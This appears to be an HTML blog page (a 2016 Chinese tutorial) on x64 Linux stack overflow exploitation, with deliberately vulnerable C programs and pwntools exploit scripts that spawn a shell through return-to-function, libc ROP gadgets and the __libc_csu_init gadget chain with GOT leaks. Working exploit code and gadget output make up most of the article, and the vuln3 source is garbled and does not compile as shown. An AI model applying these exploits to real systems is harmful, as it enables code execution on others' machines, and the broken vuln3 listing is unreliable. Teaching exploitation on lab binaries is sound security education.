@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Linux_x64 PWN | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="linux_x64与linux_x86的区别主要两点：1.内存地址的范围由32位变成了64位，但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。2.参数传递方式发生改变，x86参数都是保存在栈上，x64中的前6个参数依次保存在rdi, rsi, rdx, rcx, r8和r9中，如果有更多参数则保存在栈上。拿一个简单的程序演示： 12345678910111213">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux_x64 PWN">
+<meta property="og:url" content="http://example.com/2016/04/04/Linux-x64-PWN/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="linux_x64与linux_x86的区别主要两点：1.内存地址的范围由32位变成了64位，但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。2.参数传递方式发生改变，x86参数都是保存在栈上，x64中的前6个参数依次保存在rdi, rsi, rdx, rcx, r8和r9中，如果有更多参数则保存在栈上。拿一个简单的程序演示： 12345678910111213">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/linuxx64pwn/vuln1.png">
+<meta property="og:image" content="http://example.com/images/linuxx64pwn/vuln1_stack1.png">
+<meta property="og:image" content="http://example.com/images/linuxx64pwn/callsystem.png">
+<meta property="article:published_time" content="2016-04-04T02:51:12.000Z">
+<meta property="article:modified_time" content="2020-11-12T02:26:14.714Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/linuxx64pwn/vuln1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Linux-x64-PWN" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/04/04/Linux-x64-PWN/" class="article-date">
+  <time datetime="2016-04-04T02:51:12.000Z" itemprop="datePublished">2016-04-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Linux_x64 PWN
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="linux-x64与linux-x86的区别"><a href="#linux-x64与linux-x86的区别" class="headerlink" title="linux_x64与linux_x86的区别"></a>linux_x64与linux_x86的区别</h3><p>主要两点：<br>1.内存地址的范围由32位变成了64位，但是可以使用的内存地址不能大于<code>0x00007fffffffffff</code>，否则会抛出异常。<br>2.参数传递方式发生改变，x86参数都是保存在栈上，x64中的前6个参数依次保存在<code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code>和<code>r9</code>中，如果有更多参数则保存在栈上。<br>拿一个简单的程序演示：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* compile on Linux_64 with gcc -fno-stack-protector vuln1 -o vuln1.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>用gdb简单的反编译一下vulnerable_function<br><img src="/images/linuxx64pwn/vuln1.png"><br>由<code>lea rax, [rbp-0x80]</code>可知栈结构如下：<br><img src="/images/linuxx64pwn/vuln1_stack1.png"><br>所以要overwrite<code>rip</code>为callsystem()函数的地址，需要136(0x80+8)个占位字节+callsystem()的地址。<br><img src="/images/linuxx64pwn/callsystem.png"><br>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./vuln1&#x27;</span>)</span><br><span class="line">callsystem = <span class="number">0x400584</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">136</span> + p64(callsystem)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用工具寻找gadgets"><a href="#使用工具寻找gadgets" class="headerlink" title="使用工具寻找gadgets"></a>使用工具寻找gadgets</h3><p>x64的参数会保存在寄存器中，所以需要找一些类似于<code>pop rdi; ret</code>这样的gadget，借助工具如<a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget/tree/master">ROPgadget</a>查找会更加快捷方便。<br>再用一个简单的例子演示：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* compile on linux_64 with gcc -fno-stack-protector vuln2.c -o vuln2 -ldl */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">systemaddr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *handle = dlopen(<span class="string">&quot;libc.so.6&quot;</span>, RTLD_LAZY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, dlsym(handle, <span class="string">&quot;system&quot;</span>));</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    systemaddr();</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序会打印system()在内存中的地址，这样就不需要考虑ASLR的问题了，只要想办法执行<code>system(&quot;/bin/sh&quot;)</code>就行。需要找一个将rdi指向”/bin/sh”的gadgets：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary vuln2 --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x00000000004006d2 : pop rbp ; ret</span><br><span class="line">0x00000000004006d1 : pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000400585 : ret</span><br><span class="line">0x0000000000400735 : ret 0xbdb8</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure>
+<p>因为程序较小，没有<code>pop rdi; ret</code>这个gadgets。可以从libc.so中找，因为程序本身会load libc.so到内存中，并打印system()的地址，所以找到gadgets后可以通过system()计算出libc.so在内存中的基址，从而得到gadgets在内存中的实际地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; | grep rdi</span><br><span class="line">0x000000000001f7a6 : pop rdi ; pop rbp ; ret</span><br><span class="line">0x0000000000022b1a : pop rdi ; ret</span><br><span class="line">0x00000000001331ad : pop rdi ; ret 0xffee</span><br></pre></td></tr></table></figure>
+<p>成功找到了<code>pop rdi; ret</code>这个gadget，构造ROP链：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;\x00&quot;</span> * <span class="number">136</span> + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure>
+<p>或者，因为我们只需要调用一次system()函数就可以获取shell，所以可以搜索不带ret的gadgets：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary libc.so.6 --only &quot;pop|call&quot; | grep rdi</span><br><span class="line">0x000000000017956b : call qword ptr [rdi]</span><br><span class="line">0x00000000000238f0 : call rdi</span><br><span class="line">0x00000000000fa479 : pop rax ; pop rdi ; call rax</span><br><span class="line">0x00000000000fa47a : pop rdi ; call rax</span><br></pre></td></tr></table></figure>
+<p>发现<code>pop rax ; pop rdi ; call rax</code>也可以完成目标，将<code>rax</code>赋值system()的地址，<code>rdi</code>赋值为”/bin/sh”的地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;\x00&quot;</span> * <span class="number">136</span> + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)</span><br></pre></td></tr></table></figure>
+<p>这两个ROP链都可以完成目标，随便选择一个进行攻击即可。<br>最终的exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./vuln2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr_str = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">system_addr = <span class="built_in">int</span>(system_addr_str,<span class="number">16</span>)</span><br><span class="line">base_addr = system_addr - libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">binsh_addr = base_addr + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pop_ret_addr = base_addr + <span class="number">0x0000000000022b1a</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span> * <span class="number">136</span> + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="通用gadgets"><a href="#通用gadgets" class="headerlink" title="通用gadgets"></a>通用gadgets</h3><p>程序在编译过程中会加入一些通用的函数来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但初始化过程是相同的，因此针对这些初始化函数，可以提取一些通用的gadgets来用。<br>拿一个升级版的程序演示：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* compile on linux_64 with gcc -o vuln3 vuln3.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个程序只有一个buffer overflow，先要想办法泄露内存信息，找到system()的值，再传递<code>&quot;/bin/sh&quot;</code>到<code>.bss</code>段，最后调用<code>system(&quot;/bin/sh&quot;)</code>。源程序中使用了<code>write()</code>和<code>read()</code>函数，可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。<br>在x64下有一些万能的gadgets可以使用。比如用<code>objdump -d vuln3</code>观察一下<code>__libc_csu_init()</code>这个函数。程序只要调用了libc.so，就会有这个函数对libc进行初始化。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">00000000004005a0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4005a0:	48 89 6c 24 d8       	mov    %rbp,-0x28(%rsp)</span><br><span class="line">  4005a5:	4c 89 64 24 e0       	mov    %r12,-0x20(%rsp)</span><br><span class="line">  4005aa:	48 8d 2d 73 08 20 00 	lea    0x200873(%rip),%rbp        # 600e24 &lt;__init_array_end&gt;</span><br><span class="line">  4005b1:	4c 8d 25 6c 08 20 00 	lea    0x20086c(%rip),%r12        # 600e24 &lt;__init_array_end&gt;</span><br><span class="line">  4005b8:	4c 89 6c 24 e8       	mov    %r13,-0x18(%rsp)</span><br><span class="line">  4005bd:	4c 89 74 24 f0       	mov    %r14,-0x10(%rsp)</span><br><span class="line">  4005c2:	4c 89 7c 24 f8       	mov    %r15,-0x8(%rsp)</span><br><span class="line">  4005c7:	48 89 5c 24 d0       	mov    %rbx,-0x30(%rsp)</span><br><span class="line">  4005cc:	48 83 ec 38          	sub    $0x38,%rsp</span><br><span class="line">  4005d0:	4c 29 e5             	sub    %r12,%rbp</span><br><span class="line">  4005d3:	41 89 fd             	mov    %edi,%r13d</span><br><span class="line">  4005d6:	49 89 f6             	mov    %rsi,%r14</span><br><span class="line">  4005d9:	48 c1 fd 03          	sar    $0x3,%rbp</span><br><span class="line">  4005dd:	49 89 d7             	mov    %rdx,%r15</span><br><span class="line">  4005e0:	e8 1b fe ff ff       	callq  400400 &lt;_init&gt;</span><br><span class="line">  4005e5:	48 85 ed             	test   %rbp,%rbp</span><br><span class="line">  4005e8:	74 1c                	je     400606 &lt;__libc_csu_init+0x66&gt;</span><br><span class="line">  4005ea:	31 db                	xor    %ebx,%ebx</span><br><span class="line">  4005ec:	0f 1f 40 00          	nopl   0x0(%rax)</span><br><span class="line">  4005f0:	4c 89 fa             	mov    %r15,%rdx</span><br><span class="line">  4005f3:	4c 89 f6             	mov    %r14,%rsi</span><br><span class="line">  4005f6:	44 89 ef             	mov    %r13d,%edi</span><br><span class="line">  4005f9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)</span><br><span class="line">  4005fd:	48 83 c3 01          	add    $0x1,%rbx</span><br><span class="line">  400601:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400604:	75 ea                	jne    4005f0 &lt;__libc_csu_init+0x50&gt;</span><br><span class="line">  400606:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx</span><br><span class="line">  40060b:	48 8b 6c 24 10       	mov    0x10(%rsp),%rbp</span><br><span class="line">  400610:	4c 8b 64 24 18       	mov    0x18(%rsp),%r12</span><br><span class="line">  400615:	4c 8b 6c 24 20       	mov    0x20(%rsp),%r13</span><br><span class="line">  40061a:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14</span><br><span class="line">  40061f:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15</span><br><span class="line">  400624:	48 83 c4 38          	add    $0x38,%rsp</span><br><span class="line">  400628:	c3                   	retq   </span><br></pre></td></tr></table></figure>
+<p>可以看到利用0x400606处的代码我们可以控制<code>rbx</code>, <code>rbp</code>, <code>r12</code>, <code>r13</code>, <code>r14</code>和<code>r15</code>的值，随后利用0x4005f0处的代码，可以将<code>r15</code>, <code>r14</code>, <code>r13</code>的值赋给<code>rdx</code>, <code>rsi</code>, <code>edi</code>。接着调用<code>call qword ptr [r12+rbx*8]</code>。只要将<code>rbx</code>的值设为0，再构造栈上的数据就可以控制pc去调用相关函数了。<br>执行完call之后，程序会对rbx+1，然后比较rbp和rbx的值，如果相等就继续执行并ret到想要继续执行的地址。为了让rbp和rbx的值相等，可以将rbp的值设为1，因为之前把rbx设为了0。<br>先构造payload1，利用write()输出write在内存中的地址。因为gadget是call qword ptr <code>[r12+rbx*8]</code>，所以应该使用write.got而不是write.plt的地址(got里存的是地址，plt里存的是指令)。并且为了返回原程序中，重复利用buffer overflow，我们需要再次覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rdi = r13, rsi = r14, rdx = r15</span></span><br><span class="line"><span class="comment"># write(rdi = 1, rsi = write.got, rdx = 4)</span></span><br><span class="line">payload1 = <span class="string">&quot;\x00&quot;</span> * <span class="number">136</span></span><br><span class="line"><span class="comment"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span></span><br><span class="line">payload1 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0xdeadbeff</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>)</span><br><span class="line"><span class="comment"># mov rdx,r15; mov rsi,r14; mov edi,r13d; call qword ptr [r12+rbx*8]</span></span><br><span class="line">payload1 += p64(<span class="number">0x4005f0</span>)</span><br><span class="line">payload1 += <span class="string">&quot;\x00&quot;</span> * <span class="number">0x38</span></span><br><span class="line">payload1 += p64(main)</span><br></pre></td></tr></table></figure>
+<p>exp接收到write()在内存中的地址后，可以计算出system()在内存中的地址。构造payload2，利用read()将system()的地址以及”/bin/sh”写入到.bss段内存中。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># read(rdi = 0, rsi = bss_addr, rdx = 16)</span></span><br><span class="line">payload2 = <span class="string">&quot;\x00&quot;</span> * <span class="number">136</span></span><br><span class="line">payload2 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_read) + p64(<span class="number">0</span>) + p64(bss_addr) + p64(<span class="number">16</span>)</span><br><span class="line">payload2 += p64(<span class="number">0x4005f0</span>)</span><br><span class="line">payload2 += <span class="string">&quot;\x00&quot;</span> * <span class="number">0x38</span></span><br><span class="line">payload2 += p64(main)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>.bss段的地址:<br>$ readelf -S vuln3<br>There are 30 section headers, starting at offset 0x1150:<br>Section Headers:<br>  [Nr] Name              Type             Address           Offset       Size              EntSize          Flags  Link  Info  Align<br>  …<br>  [25] .bss              NOBITS           0000000000601028  00001028       0000000000000010  0000000000000000  WA       0     0     8<br> …</p>
+</blockquote>
+<p>最后构造payload3，调用system()函数执行”/bin/sh”。system()的地址保存在了.bss段首地址上，”/bin/sh”的地址保存在了.bss段首地址+8字节上。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)</span></span><br><span class="line">payload3 = <span class="string">&quot;\x00&quot;</span> * <span class="number">136</span></span><br><span class="line">payload3 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload3 += p64(<span class="number">0x4005f0</span>)</span><br><span class="line">payload3 += <span class="string">&quot;\x00&quot;</span> * <span class="number">0x38</span></span><br><span class="line">payload3 += p64(main)</span><br></pre></td></tr></table></figure>
+<p>最终的<a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1gf4jGRL">exp</a><br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/7551">http://drops.wooyun.org/papers/7551</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2016/04/04/Linux-x64-PWN/" data-id="ckhe7o4ln002nchl76betdsz3" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/04/04/ELF-Executable-and-Linking-Format-part1/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          ELF: Executable and Linking Format part1
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/03/23/x86-Memory-Leak%E5%9C%A8%E4%B8%8D%E8%8E%B7%E5%8F%96libc-so%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E8%BF%9B%E8%A1%8CROP%E6%94%BB%E5%87%BB/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">x86 Memory Leak在不获取libc.so的情况下进行ROP攻击</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARM/" rel="tag">ARM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithms/" rel="tag">Algorithms</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blockchain/" rel="tag">Blockchain</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C-C/" rel="tag">C/C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine-Learning/" rel="tag">Machine Learning</a></li><li class="tag-list-item"><a class="tag-list-link" 